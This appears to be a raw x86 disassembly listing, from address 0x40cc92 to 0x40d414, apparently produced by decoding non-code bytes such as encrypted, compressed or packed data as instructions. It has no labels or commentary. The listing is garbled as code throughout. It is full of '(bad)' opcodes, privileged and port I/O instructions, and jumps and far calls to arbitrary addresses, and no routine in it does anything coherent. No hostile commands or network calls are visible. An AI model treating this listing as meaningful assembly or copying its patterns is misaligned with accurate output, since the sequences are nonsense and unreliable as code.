  40cc92:	in     al,dx
  40cc93:	in     eax,dx
  40cc94:	arpl   di,ax
  40cc96:	inc    esi
  40cc97:	(bad)  
  40cc98:	xor    eax,0xdb8700d6
  40cc9d:	es icebp 
  40cc9f:	push   esp
  40cca0:	stc    
  40cca1:	icebp  
  40cca2:	mov    esp,0xc23db44e
  40cca7:	stc    
  40cca8:	icebp  
  40cca9:	or     DWORD PTR [esi+ebx*2-0x5b],esp
  40ccad:	jb     0x40cca5
  40ccaf:	rdpmc  
  40ccb1:	xor    DWORD PTR [eax],esp
  40ccb3:	gs pop cx
  40ccb6:	sahf   
  40ccb7:	sub    eax,0x2d77414
  40ccbc:	aaa    
  40ccbd:	cwde   
  40ccbe:	les    ebp,FWORD PTR [ecx+ebx*2-0x212d8bba]
  40ccc5:	nop
  40ccc6:	mov    ds:0x3aad747d,eax
  40cccb:	leave  
  40cccc:	not    DWORD PTR [esi-0x2e9462b5]
  40ccd2:	push   0x12
  40ccd4:	dec    edx
  40ccd5:	(bad)  
  40ccd6:	mov    esp,0xba3805e2
  40ccdb:	les    ebp,FWORD PTR [edi]
  40ccdd:	ins    DWORD PTR es:[edi],dx
  40ccde:	mov    esp,0x59f4f90c
  40cce3:	jecxz  0x40cc9d
  40cce5:	sub    ebx,edi
  40cce7:	cmp    DWORD PTR [ecx-0x7af775cd],ebp
  40cced:	pop    ecx
  40ccee:	into   
  40ccef:	mov    edx,DWORD PTR [edi]
  40ccf1:	and    eax,0x86e285c9
  40ccf6:	out    0xae,eax
  40ccf8:	or     DWORD PTR [ecx],edx
  40ccfa:	xchg   edx,eax
  40ccfb:	jbe    0x40cd47
  40ccfd:	std    
  40ccfe:	mov    bl,0x24
  40cd00:	es jae 0x40cd5e
  40cd03:	(bad)  
  40cd04:	in     al,dx
  40cd05:	std    
  40cd06:	fcmovnb st,st(0)
  40cd08:	push   ds
  40cd09:	xchg   DWORD PTR [ebx],eax
  40cd0b:	xchg   ebx,eax
  40cd0c:	and    esi,esi
  40cd0e:	or     dh,BYTE PTR [edx-0x2c]
  40cd11:	fldcw  WORD PTR [ebp+edi*8+0x706263af]
  40cd18:	out    dx,eax
  40cd19:	adc    ecx,esp
  40cd1b:	push   ebp
  40cd1c:	ror    BYTE PTR [ebp+0x68],1
  40cd1f:	jmp    0xb450caef
  40cd24:	sbb    bh,ah
  40cd26:	jbe    0x40ccf6
  40cd28:	sub    BYTE PTR [ebp+0x7b7c40b4],ch
  40cd2e:	ss cmp ecx,edi
  40cd31:	shl    DWORD PTR [edx+0x7155bf7c],cl
  40cd37:	xor    BYTE PTR [ebp+0x14],dh
  40cd3a:	in     al,0xba
  40cd3c:	push   esp
  40cd3d:	shl    eax,1
  40cd3f:	adc    al,0x3d
  40cd41:	aaa    
  40cd42:	ss ins DWORD PTR es:[edi],dx
  40cd44:	(bad)  
  40cd45:	pop    ds
  40cd46:	sahf   
  40cd47:	in     al,dx
  40cd48:	ror    BYTE PTR [ebx+0x7],1
  40cd4b:	loopne 0x40cd0f
  40cd4d:	cmc    
  40cd4e:	mov    bl,0x5f
  40cd50:	imul   edi,DWORD PTR [eax-0x5223baf7],0x3fc29348
  40cd5a:	xor    eax,0x85f865d
  40cd5f:	xchg   ebp,eax
  40cd60:	push   0x46
  40cd62:	push   ss
  40cd63:	ins    BYTE PTR es:[edi],dx
  40cd64:	adc    eax,0x5a45863a
  40cd69:	dec    esp
  40cd6a:	repz mov edx,0xc61242a4
  40cd70:	mov    dl,0x6c
  40cd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd73:	sbb    eax,0x6dfc5cf9
  40cd78:	adc    al,0xcd
  40cd7a:	retw   
  40cd7c:	inc    esi
  40cd7d:	sbb    ebp,esi
  40cd7f:	js     0x40cd9f
  40cd81:	sbb    dh,al
  40cd83:	int    0x33
  40cd85:	jg     0x40cdc1
  40cd87:	es stos BYTE PTR es:[edi],al
  40cd89:	inc    edi
  40cd8a:	add    bl,BYTE PTR [esi]
  40cd8c:	pop    ecx
  40cd8d:	push   es
  40cd8e:	lods   al,BYTE PTR ds:[esi]
  40cd8f:	das    
  40cd90:	or     edi,esp
  40cd92:	mov    edi,0x115cdc43
  40cd97:	mov    ah,0x33
  40cd99:	or     al,0x5c
  40cd9b:	jne    0x40cda7
  40cd9d:	mov    eax,0x782fb594
  40cda2:	div    BYTE PTR [eax+0x38]
  40cda5:	sbb    edi,DWORD PTR [esi+eiz*2+0x4]
  40cda9:	xchg   ebx,eax
  40cdaa:	push   ebp
  40cdab:	outs   dx,BYTE PTR ds:[esi]
  40cdac:	sbb    DWORD PTR [ecx+0x26],edi
  40cdaf:	hlt    
  40cdb0:	push   ds
  40cdb1:	retf   0x1e00
  40cdb4:	sub    ebx,DWORD PTR [eax+0x48a721ee]
  40cdba:	ret    0x497a
  40cdbd:	adc    DWORD PTR [edi+0x34],esp
  40cdc0:	popf   
  40cdc1:	mov    edx,esp
  40cdc3:	sar    BYTE PTR fs:[eax+0xd],0x37
  40cdc8:	bound  si,DWORD PTR [ebx]
  40cdcb:	or     DWORD PTR [eax+0x46],0xffffff83
  40cdcf:	fidivr DWORD PTR fs:[ebx+0x1ea07144]
  40cdd6:	jae    0x40cdeb
  40cdd8:	lods   al,BYTE PTR ds:[esi]
  40cdd9:	test   al,0xb5
  40cddb:	(bad)  
  40cddc:	loopne 0x40cdec
  40cdde:	or     eax,0x10342be5
  40cde3:	(bad)  
  40cde4:	into   
  40cde5:	push   edi
  40cde6:	and    BYTE PTR [esi+0x37],0x31
  40cdea:	jo     0x40cd90
  40cdec:	mov    ah,0xa5
  40cdee:	sbb    bl,BYTE PTR [edi+0x7e]
  40cdf1:	dec    esp
  40cdf2:	jge    0x40ce4d
  40cdf4:	mov    esi,edx
  40cdf6:	mov    esp,0xa49f1ca0
  40cdfb:	es or  eax,0x5e2427d8
  40ce01:	sbb    ebp,esp
  40ce03:	loop   0x40cdf9
  40ce05:	jnp    0x40ce2e
  40ce07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce08:	dec    edx
  40ce09:	iret   
  40ce0a:	add    esi,DWORD PTR [edi-0x2bcc8d9a]
  40ce10:	mov    al,ds:0x10be9081
  40ce15:	out    dx,eax
  40ce16:	mov    bl,0x16
  40ce18:	add    ah,BYTE PTR [ebp+esi*2+0xe]
  40ce1c:	inc    ebp
  40ce1d:	stc    
  40ce1e:	lea    ebx,[ecx+0x19]
  40ce21:	cmp    al,0xd8
  40ce23:	mov    DWORD PTR [edi+0x1bfedffb],esi
  40ce29:	pop    es
  40ce2a:	adc    dl,cl
  40ce2c:	pop    es
  40ce2d:	inc    eax
  40ce2e:	push   eax
  40ce2f:	jg     0x40cde4
  40ce31:	out    dx,eax
  40ce32:	rdpmc  
  40ce34:	jge    0x40ce91
  40ce36:	xchg   ebp,eax
  40ce37:	push   es
  40ce38:	retf   0x1d15
  40ce3b:	cmp    ebp,esp
  40ce3d:	repz in eax,dx
  40ce3f:	adc    ebp,DWORD PTR [esp+ecx*1]
  40ce42:	in     al,dx
  40ce43:	stc    
  40ce44:	mov    BYTE PTR [ecx+edi*4-0x6],dl
  40ce48:	fidiv  WORD PTR [esi]
  40ce4a:	icebp  
  40ce4b:	ret    0xc970
  40ce4e:	mov    ds:0x9bb7d848,al
  40ce53:	push   esp
  40ce54:	push   0x47
  40ce56:	rcr    BYTE PTR [ebp+0x24f0906c],0xb7
  40ce5d:	imul   ebx,DWORD PTR [eax+0x1b7b9d93],0xaeca4f87
  40ce67:	pop    edi
  40ce68:	cwde   
  40ce69:	mov    ah,0xe5
  40ce6b:	mov    DWORD PTR [ebp+0x5f],esi
  40ce6e:	pop    ebx
  40ce6f:	and    bh,al
  40ce71:	repnz neg DWORD PTR [ebx]
  40ce74:	pushf  
  40ce75:	ror    BYTE PTR ss:[ebx],1
  40ce78:	imul   ebx,edx,0xffffffe5
  40ce7b:	repz sbb BYTE PTR [edi+0x18],al
  40ce7f:	mov    ds:0xcbc9e1df,eax
  40ce84:	jmp    0x27f44f5b
  40ce89:	jns    0x40ce3f
  40ce8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce8c:	fwait
  40ce8d:	pusha  
  40ce8e:	arpl   WORD PTR [edi-0x32],di
  40ce91:	and    BYTE PTR [edi+0x73],ch
  40ce94:	scas   al,BYTE PTR es:[edi]
  40ce95:	push   ss
  40ce96:	jo     0x40ce7f
  40ce98:	pop    edi
  40ce99:	sub    BYTE PTR [edi-0x63],ch
  40ce9c:	imul   ecx,DWORD PTR [ebx],0x86846f64
  40cea2:	jecxz  0x40ce63
  40cea4:	test   al,0xc2
  40cea6:	aas    
  40cea7:	pop    ebx
  40cea8:	js     0x40ce2f
  40ceaa:	loop   0x40ce7f
  40ceac:	and    eax,0x6d93b67f
  40ceb1:	lahf   
  40ceb2:	rcl    DWORD PTR [esp+edx*1],0x53
  40ceb6:	call   0x94c:0x49e3c8b0
  40cebd:	push   cs
  40cebe:	add    ch,BYTE PTR [esi]
  40cec0:	inc    edi
  40cec1:	push   0x8afc330d
  40cec6:	push   ds
  40cec7:	fwait
  40cec8:	addr16 out dx,al
  40ceca:	jo     0x40cea0
  40cecc:	test   BYTE PTR [ecx+0x3a92f662],ah
  40ced2:	fst    DWORD PTR [eax-0x7a0d52b0]
  40ced8:	pop    edi
  40ced9:	cwde   
  40ceda:	cmp    DWORD PTR [esi],edi
  40cedc:	mov    bh,0x7a
  40cede:	mov    WORD PTR [ebp+0x6cdd308a],?
  40cee4:	xor    bl,BYTE PTR [ecx+0x14]
  40cee7:	pop    ecx
  40cee8:	sahf   
  40cee9:	jl     0x40cee7
  40ceeb:	push   0xffffffa0
  40ceed:	cmc    
  40ceee:	and    ebx,0x30
  40cef1:	mov    ch,0xfa
  40cef3:	sbb    BYTE PTR [eax-0x23],dh
  40cef6:	mov    eax,ds:0x22a24afc
  40cefb:	lahf   
  40cefc:	push   esi
  40cefd:	repnz xor esi,DWORD PTR [ecx+0x3b]
  40cf01:	dec    eax
  40cf02:	(bad)  
  40cf03:	xor    BYTE PTR [esi+ebx*1],dh
  40cf06:	inc    esp
  40cf07:	adc    ecx,DWORD PTR [eax+0x4e8f07f7]
  40cf0d:	mov    ds:0x811fb120,eax
  40cf12:	xchg   esp,eax
  40cf13:	lods   al,BYTE PTR ds:[esi]
  40cf14:	pushf  
  40cf15:	sub    esp,DWORD PTR [ecx]
  40cf17:	imul   edx,DWORD PTR ds:0x50bbc78b,0x4de24b7
  40cf21:	rol    DWORD PTR [edi],cl
  40cf23:	leave  
  40cf24:	cs (bad) 
  40cf26:	or     DWORD PTR [esi-0x7c0757c5],ebx
  40cf2c:	mov    esp,?
  40cf2e:	sar    DWORD PTR [edx+0xbe735d9],cl
  40cf34:	mov    ds,WORD PTR [ecx-0x6d]
  40cf37:	pop    ss
  40cf38:	pop    edi
  40cf39:	clc    
  40cf3a:	fs iret 
  40cf3c:	hlt    
  40cf3d:	add    eax,DWORD PTR [eax]
  40cf3f:	mov    esp,0x124296cf
  40cf44:	in     eax,dx
  40cf45:	adc    al,0x55
  40cf47:	mov    ebp,0x602317d2
  40cf4c:	fisubr DWORD PTR [esi-0x60ceb1e7]
  40cf52:	sub    ecx,ebp
  40cf54:	jmp    0x40cf16
  40cf56:	mov    ds:0x6d55398a,al
  40cf5b:	imul   edi,DWORD PTR [ebx],0xd92f4583
  40cf61:	xor    bl,ah
  40cf63:	sar    BYTE PTR [edx+0xe],0x62
  40cf67:	or     ax,0xf996
  40cf6b:	jmp    0xd696135f
  40cf70:	std    
  40cf71:	push   esp
  40cf72:	test   BYTE PTR [esi+0x2c4772a3],bh
  40cf78:	push   ecx
  40cf79:	mov    eax,0x742b2e72
  40cf7e:	add    esp,DWORD PTR [edi-0x60086ef1]
  40cf84:	shr    esi,0x8b
  40cf87:	shl    BYTE PTR [ebp+0x36d75602],cl
  40cf8d:	mov    DWORD PTR [edx-0x66],esi
  40cf90:	cmp    BYTE PTR [ecx+0x3f656ae3],bh
  40cf96:	lods   al,BYTE PTR ds:[esi]
  40cf97:	arpl   WORD PTR [esi],cx
  40cf99:	je     0x40cf96
  40cf9b:	ret    0x5fc4
  40cf9e:	ret    0x302a
  40cfa1:	fs (bad) 
  40cfa3:	hlt    
  40cfa4:	neg    DWORD PTR [edx+0xebde515]
  40cfaa:	mov    esi,0x7c4e501e
  40cfaf:	pop    es
  40cfb0:	test   DWORD PTR [eax],ebp
  40cfb2:	add    dl,BYTE PTR [ecx-0x7dfed113]
  40cfb8:	(bad)  
  40cfb9:	bound  ebp,QWORD PTR [ebx+0x45]
  40cfbc:	mov    edi,DWORD PTR [eax-0x7b]
  40cfbf:	mov    BYTE PTR [ebp+0x2707c606],cl
  40cfc5:	pop    esi
  40cfc6:	xor    DWORD PTR [esi+0x4e],esp
  40cfc9:	push   ebx
  40cfca:	icebp  
  40cfcb:	mov    dl,0xac
  40cfcd:	call   0xb9eddbd
  40cfd2:	retf   
  40cfd3:	sub    bl,dl
  40cfd5:	jmp    0xe76573e6
  40cfda:	push   esp
  40cfdb:	add    BYTE PTR [eax],ah
  40cfdd:	shr    BYTE PTR [edi+0x73cd7d1a],cl
  40cfe3:	add    al,0xf8
  40cfe5:	mov    ch,0x4d
  40cfe7:	in     eax,dx
  40cfe8:	stos   BYTE PTR es:[edi],al
  40cfe9:	fsubr  st(6),st
  40cfeb:	adc    BYTE PTR [edi-0x1afeba5f],bh
  40cff1:	shl    DWORD PTR ds:0xc3844065,1
  40cff7:	sahf   
  40cff8:	test   al,0x34
  40cffa:	in     eax,dx
  40cffb:	ins    BYTE PTR es:[edi],dx
  40cffc:	and    eax,DWORD PTR [esi+0x13078bc0]
  40d002:	fadd   st,st(2)
  40d004:	mov    esi,0xc3bd7289
  40d009:	cmp    ecx,ebx
  40d00b:	add    eax,0x614bfaad
  40d010:	pushf  
  40d011:	inc    ebp
  40d012:	xchg   BYTE PTR [esi],cl
  40d014:	mov    ecx,0xd4340886
  40d019:	add    eax,0xc4dc07d0
  40d01e:	add    al,0x85
  40d020:	in     eax,0x54
  40d022:	mov    eax,ecx
  40d024:	add    eax,0x4f6a0c47
  40d029:	xlat   BYTE PTR es:[ebx]
  40d02b:	ds push cs
  40d02d:	push   ebp
  40d02e:	adc    al,0x9e
  40d030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d031:	mov    ebp,DWORD PTR [ebx+0x48789e72]
  40d037:	out    0x6,eax
  40d039:	mov    dh,0x2b
  40d03b:	sub    dl,dl
  40d03d:	sub    BYTE PTR [ebx+0x17be8db7],dh
  40d043:	retf   0x2152
  40d046:	push   esp
  40d047:	cmp    al,0x8c
  40d049:	je     0x40d0a5
  40d04b:	sub    bh,dh
  40d04d:	add    bh,BYTE PTR [edx+0x5b]
  40d050:	(bad)  
  40d051:	loopne 0x40d0a9
  40d053:	mov    BYTE PTR [edx-0x17e8fa07],dl
  40d059:	sub    DWORD PTR [ebx-0x3cda326b],ecx
  40d05f:	cdq    
  40d060:	out    0xa8,eax
  40d062:	pusha  
  40d063:	cmp    BYTE PTR [ebp+edx*1-0x50f8b155],ah
  40d06a:	lds    ecx,FWORD PTR [esi]
  40d06c:	pop    ss
  40d06d:	pusha  
  40d06e:	jg     0x40d05b
  40d070:	in     ax,0x79
  40d073:	sub    dh,dl
  40d075:	ins    BYTE PTR es:[edi],dx
  40d076:	out    0x7,eax
  40d078:	fisub  DWORD PTR [ebx]
  40d07a:	ja     0x40d048
  40d07c:	mov    eax,ds:0x18010188
  40d081:	xchg   ecx,eax
  40d082:	scas   al,BYTE PTR es:[edi]
  40d083:	addr16 push edi
  40d085:	inc    ecx
  40d086:	push   ecx
  40d087:	popf   
  40d088:	retf   
  40d089:	mov    cl,0xf9
  40d08b:	cmp    esp,DWORD PTR [eax]
  40d08d:	and    ecx,DWORD PTR [edi+0x3879e24]
  40d093:	mov    ds:0x49d65ada,al
  40d098:	jp     0x40d07c
  40d09a:	leave  
  40d09b:	sub    BYTE PTR [ebx],ah
  40d09d:	ror    BYTE PTR [eax+eiz*8-0x6fede62b],0xe9
  40d0a5:	addr16 sub al,0x55
  40d0a8:	aas    
  40d0a9:	inc    edx
  40d0aa:	repz jecxz 0x40d0bc
  40d0ad:	jnp    0x40d11b
  40d0af:	mov    ds:0xa3bdfbe,al
  40d0b4:	and    eax,0x90119416
  40d0b9:	and    eax,0x45a34f3d
  40d0be:	loope  0x40d101
  40d0c0:	shl    DWORD PTR [edx-0x34],0xc6
  40d0c4:	loop   0x40d126
  40d0c6:	lods   al,BYTE PTR ds:[esi]
  40d0c7:	inc    ebx
  40d0c8:	mov    BYTE PTR [edi+0x6fb5b6c4],dh
  40d0ce:	or     BYTE PTR [edx+edx*8-0x57],dh
  40d0d2:	loopne 0x40d0c9
  40d0d4:	hlt    
  40d0d5:	imul   BYTE PTR [eax-0x35815622]
  40d0db:	repz scas eax,DWORD PTR es:[edi]
  40d0dd:	retf   0x93ae
  40d0e0:	inc    edx
  40d0e1:	stos   DWORD PTR es:[edi],eax
  40d0e2:	push   cs
  40d0e3:	adc    DWORD PTR [ecx+0x10533e15],ebx
  40d0e9:	or     ebx,DWORD PTR [ecx]
  40d0eb:	popa   
  40d0ec:	add    ebp,0xf46df16e
  40d0f2:	add    eax,0xed7b0542
  40d0f7:	mov    BYTE PTR [edx],ch
  40d0f9:	mov    eax,DWORD PTR cs:[edx+0x2f]
  40d0fd:	sub    eax,0xb55f3750
  40d102:	sbb    eax,0x8a2907bb
  40d107:	daa    
  40d108:	xchg   esi,eax
  40d109:	push   cs
  40d10a:	cdq    
  40d10b:	dec    ebx
  40d10c:	aad    0x46
  40d10e:	sbb    eax,0x3e66283a
  40d113:	xor    al,ah
  40d115:	dec    ebx
  40d116:	(bad)  
  40d117:	jae    0x40d159
  40d119:	inc    ecx
  40d11a:	inc    ecx
  40d11b:	repnz xor eax,0xdea190ca
  40d121:	scas   eax,DWORD PTR es:[edi]
  40d122:	add    ch,ah
  40d124:	push   ebp
  40d125:	lock es and bl,dh
  40d129:	adc    ebp,ecx
  40d12b:	outs   dx,DWORD PTR ds:[esi]
  40d12c:	sbb    DWORD PTR [ebp+ebp*2+0x2d],edx
  40d130:	js     0x40d1ab
  40d132:	sbb    DWORD PTR [eax],esi
  40d134:	lahf   
  40d135:	sub    ah,BYTE PTR [ebx]
  40d137:	fwait
  40d138:	jmp    0x2a7b:0x8630f58f
  40d13f:	sbb    eax,DWORD PTR [edi]
  40d141:	enter  0xfaf3,0x7a
  40d145:	loope  0x40d185
  40d147:	mov    cl,0x2
  40d149:	mov    eax,ds:0xe48d248
  40d14e:	imul   BYTE PTR [eax+0x1e8af880]
  40d154:	in     al,0x32
  40d156:	pop    esi
  40d157:	ins    DWORD PTR es:[edi],dx
  40d158:	jle    0x40d122
  40d15a:	dec    ebp
  40d15b:	scas   eax,DWORD PTR es:[edi]
  40d15c:	sub    eax,0x1fd29269
  40d161:	dec    ebx
  40d162:	dec    ebp
  40d163:	add    edx,esi
  40d165:	jbe    0x40d1c9
  40d167:	ret    0xe999
  40d16a:	mov    edx,0x88d468d9
  40d16f:	mov    dl,0xb
  40d171:	ret    
  40d172:	inc    ecx
  40d173:	retf   
  40d174:	sbb    BYTE PTR [eax+0x55],ah
  40d177:	in     al,0xbc
  40d179:	pop    edi
  40d17a:	xchg   edx,eax
  40d17b:	es nop
  40d17d:	push   cs
  40d17e:	pop    edi
  40d17f:	push   ds
  40d180:	hlt    
  40d181:	lods   eax,DWORD PTR ds:[esi]
  40d182:	dec    esp
  40d183:	stos   DWORD PTR es:[edi],eax
  40d184:	pop    eax
  40d185:	repnz int3 
  40d187:	pop    eax
  40d188:	adc    BYTE PTR [eax],cl
  40d18a:	xor    ebx,DWORD PTR [edi-0x6d2dd83d]
  40d190:	xor    ebp,DWORD PTR [ebx]
  40d192:	fidiv  DWORD PTR [ecx-0x24]
  40d195:	(bad)  [esi+0x66ee3528]
  40d19b:	daa    
  40d19c:	jns    0x40d177
  40d19e:	jmp    0x16e4:0x943ea86d
  40d1a5:	pushf  
  40d1a6:	js     0x40d1fd
  40d1a8:	hlt    
  40d1a9:	repz int 0x24
  40d1ac:	rol    dh,0x73
  40d1af:	inc    eax
  40d1b0:	mov    al,0x9
  40d1b2:	imul   ebp,ecx,0xffffffbd
  40d1b5:	fwait
  40d1b6:	xor    esi,DWORD PTR [edx-0x7e3f80e]
  40d1bc:	inc    ebp
  40d1bd:	mov    esi,0xde06f123
  40d1c2:	mov    cl,0xc7
  40d1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1c5:	xchg   esp,eax
  40d1c6:	retf   0x83f1
  40d1c9:	sti    
  40d1ca:	add    bl,bl
  40d1cc:	sbb    DWORD PTR [ecx],esp
  40d1ce:	pop    esp
  40d1cf:	mov    DWORD PTR [ebp+0x32],ebx
  40d1d2:	cs shl edx,1
  40d1d5:	std    
  40d1d6:	dec    eax
  40d1d7:	scas   eax,DWORD PTR es:[edi]
  40d1d8:	add    ch,BYTE PTR [ebx+0x6b]
  40d1db:	mov    ch,BYTE PTR [edi]
  40d1dd:	(bad)  
  40d1de:	mov    edi,0xb63f5545
  40d1e3:	mov    bl,0x53
  40d1e5:	adc    BYTE PTR [edi],ch
  40d1e7:	in     eax,dx
  40d1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e9:	sar    ebx,0x33
  40d1ec:	inc    edx
  40d1ed:	xchg   esi,eax
  40d1ee:	inc    ebp
  40d1ef:	je     0x40d1cd
  40d1f1:	sub    BYTE PTR [ebx+0xf58a83c],0x6f
  40d1f8:	mov    ds:0xd64aa465,al
  40d1fd:	jecxz  0x40d1f7
  40d1ff:	pop    ecx
  40d200:	mov    edi,0x68e2b617
  40d205:	mov    ecx,0xb2fe4a47
  40d20a:	(bad)
  40d20d:	repz and eax,0xffffffe2
  40d211:	pushf  
  40d212:	sub    eax,0xb16ba644
  40d217:	dec    edx
  40d218:	adc    BYTE PTR [ebp-0x8716ad9],bh
  40d21e:	mov    ds:0x50e8f311,eax
  40d223:	add    DWORD PTR [esi+0x68],esi
  40d226:	shl    BYTE PTR [edi],1
  40d228:	mov    ecx,0xd19fef97
  40d22d:	mov    ebx,0x68001bdf
  40d232:	ret    
  40d233:	fwait
  40d234:	nop
  40d235:	pushf  
  40d236:	xor    al,0x73
  40d238:	in     al,dx
  40d239:	add    eax,0x70d75d1f
  40d23e:	push   esi
  40d23f:	mov    dh,0x13
  40d241:	fcom   DWORD PTR [esi-0x7e]
  40d244:	add    eax,0x7441d029
  40d249:	jmp    0x332cfee4
  40d24e:	jmp    0xf2403ef
  40d253:	xchg   edx,eax
  40d254:	add    BYTE PTR [esi+0x1b8fbf5f],ah
  40d25a:	dec    esi
  40d25b:	xchg   esp,eax
  40d25c:	mov    ebp,0xfcc8d80b
  40d261:	fild   DWORD PTR [ecx+ebp*2+0x7b48cd18]
  40d268:	shr    BYTE PTR [eax-0x80],1
  40d26b:	xor    al,0xec
  40d26d:	in     eax,dx
  40d26e:	xchg   edx,eax
  40d26f:	xor    al,0x87
  40d271:	ins    DWORD PTR es:[edi],dx
  40d272:	(bad)  
  40d273:	nop
  40d274:	(bad)  
  40d276:	jmp    0xf2cfcdd8
  40d27b:	mov    esp,0xef416121
  40d280:	jmp    0x39dda86b
  40d285:	repz out 0x9b,al
  40d288:	and    DWORD PTR [eax+ecx*2+0x5da93663],esp
  40d28f:	mov    dh,0xab
  40d291:	mov    edx,DWORD PTR [ebx]
  40d293:	imul   edx,DWORD PTR [ebx+ebp*2+0x50],0xffffff8b
  40d298:	fist   DWORD PTR [edi-0xc10a8aa]
  40d29e:	(bad)  
  40d2a0:	push   edi
  40d2a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2a2:	cld    
  40d2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a4:	fnstsw WORD PTR [ebx]
  40d2a6:	mov    ecx,0x56878a6
  40d2ab:	add    BYTE PTR [edx],cl
  40d2ad:	lods   al,BYTE PTR ds:[esi]
  40d2ae:	pop    ecx
  40d2af:	and    bh,0x61
  40d2b2:	mov    ebp,0xb11c648
  40d2b7:	mov    ah,BYTE PTR [ecx]
  40d2b9:	ds or  eax,ebp
  40d2bc:	out    dx,eax
  40d2bd:	adc    ebx,esi
  40d2bf:	shl    DWORD PTR [eax+edx*4],0x88
  40d2c3:	sbb    al,0x88
  40d2c5:	jmp    0x40d2e1
  40d2c7:	fbld   TBYTE PTR [ecx]
  40d2c9:	clc    
  40d2ca:	mov    edi,0x46d82a19
  40d2cf:	rcr    BYTE PTR [eax+0x2f],0xc3
  40d2d3:	es sub al,0xac
  40d2d6:	ins    BYTE PTR es:[edi],dx
  40d2d7:	scas   eax,DWORD PTR es:[edi]
  40d2d8:	enter  0xe5c7,0xc8
  40d2dc:	mov    cl,0x1b
  40d2de:	add    esp,DWORD PTR [eax-0x3f9c5298]
  40d2e4:	out    0x8b,al
  40d2e6:	xchg   ebp,ebp
  40d2e8:	nop
  40d2e9:	adc    eax,ecx
  40d2eb:	xchg   edi,eax
  40d2ec:	repnz mov ecx,0x820eb675
  40d2f2:	cmp    eax,0x180dac78
  40d2f7:	cmp    ecx,ebx
  40d2f9:	inc    esp
  40d2fa:	fwait
  40d2fb:	sub    eax,0xf8247a00
  40d300:	imul   edx,DWORD PTR [ebp-0x4e2716f4],0x3
  40d307:	(bad)  
  40d308:	pop    ebp
  40d309:	and    DWORD PTR [edx+0x45],ebp
  40d30c:	daa    
  40d30d:	out    0xcd,eax
  40d30f:	in     eax,dx
  40d310:	push   esi
  40d311:	push   esp
  40d312:	or     esp,DWORD PTR [esi]
  40d314:	sbb    DWORD PTR [edx-0x297158b9],esp
  40d31a:	mov    cl,0x70
  40d31c:	jo     0x40d2c5
  40d31e:	adc    dl,BYTE PTR [ebx-0x10f3b0fa]
  40d324:	test   eax,0xd0fd65ac
  40d329:	pop    eax
  40d32a:	call   0x147e0448
  40d32f:	xchg   esp,eax
  40d330:	add    ah,BYTE PTR [ecx+0x49795360]
  40d336:	push   cs
  40d337:	mov    esp,0x12766504
  40d33c:	call   FWORD PTR [edi+0x32e59217]
  40d342:	dec    ebx
  40d343:	xlat   BYTE PTR ds:[ebx]
  40d344:	jns    0x40d3c5
  40d346:	into   
  40d347:	xchg   bh,dl
  40d349:	add    al,dh
  40d34b:	in     eax,dx
  40d34c:	out    0x58,al
  40d34e:	fistp  WORD PTR [esi+0x7b]
  40d351:	push   edi
  40d352:	mov    DWORD PTR [edi-0x511f6f60],esi
  40d358:	sbb    BYTE PTR [eax],cl
  40d35a:	mov    al,0x0
  40d35c:	clc    
  40d35d:	cli    
  40d35e:	and    BYTE PTR [esi],cl
  40d360:	dec    ebx
  40d361:	lea    ecx,[esi+0x2d]
  40d364:	pop    ebp
  40d365:	add    BYTE PTR [eax],0x1b
  40d368:	fsubp  st(1),st
  40d36a:	adc    al,0x16
  40d36c:	test   al,0x4b
  40d36e:	loop   0x40d35d
  40d370:	or     al,0x35
  40d372:	mov    dh,0x61
  40d374:	cli    
  40d375:	adc    eax,0xef7dd298
  40d37a:	sar    DWORD PTR [ebp+0x40],1
  40d37d:	sbb    esp,DWORD PTR [esi-0x2d]
  40d380:	loop   0x40d33d
  40d382:	pop    ss
  40d383:	add    al,0x3e
  40d385:	adc    BYTE PTR [ecx],0x6
  40d388:	inc    esi
  40d389:	dec    ebp
  40d38a:	(bad)  
  40d38b:	cdq    
  40d38c:	mov    edx,0xe7c963e8
  40d391:	inc    ecx
  40d392:	call   0x87a9:0xf709e8fc
  40d399:	or     eax,0x1c6a98b0
  40d39e:	cmp    eax,0xdec58908
  40d3a3:	in     eax,0x9c
  40d3a5:	loop   0x40d3e7
  40d3a7:	popf   
  40d3a8:	fisubr DWORD PTR ds:0xe654b295
  40d3ae:	pop    edi
  40d3af:	adc    DWORD PTR [ecx-0x5d],esi
  40d3b2:	jl     0x40d358
  40d3b4:	jecxz  0x40d433
  40d3b6:	fsubr  DWORD PTR [esi-0x67]
  40d3b9:	and    al,BYTE PTR [ebx+0x43]
  40d3bc:	icebp  
  40d3bd:	repnz inc ebp
  40d3bf:	sahf   
  40d3c0:	mov    al,ds:0x7fe9dad9
  40d3c5:	aad    0x3c
  40d3c7:	lods   eax,DWORD PTR ds:[esi]
  40d3c8:	lds    edi,FWORD PTR [esi]
  40d3ca:	mov    esi,0x82a2cb96
  40d3cf:	cmp    ebx,DWORD PTR [eax+0x35]
  40d3d2:	adc    DWORD PTR [ebx],edx
  40d3d4:	pushf  
  40d3d5:	(bad)  
  40d3d6:	mov    gs,WORD PTR [ebx+0x99ae0ab]
  40d3dc:	cmp    edi,eax
  40d3de:	(bad)  
  40d3df:	mov    bh,0xfd
  40d3e1:	cwde   
  40d3e2:	(bad)  [esi+0x4909bce4]
  40d3e8:	and    al,ch
  40d3ea:	cmp    al,0xd2
  40d3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ed:	js     0x40d3c1
  40d3ef:	imul   ebx,DWORD PTR [esi+0x2f],0xcd5fcda4
  40d3f6:	sbb    al,dh
  40d3f8:	mov    dh,0xf0
  40d3fa:	outs   dx,BYTE PTR ds:[esi]
  40d3fb:	xchg   edx,eax
  40d3fc:	and    BYTE PTR [eax+eax*8-0xd],0x42
  40d401:	push   ss
  40d402:	into   
  40d403:	lods   al,BYTE PTR ds:[esi]
  40d404:	div    BYTE PTR [eax+0x1a]
  40d407:	test   DWORD PTR ds:0x7196b9c3,esp
  40d40d:	ja     0x4e8fd07f
  40d413:	pushf  
  40d414:	jg     0x40d431
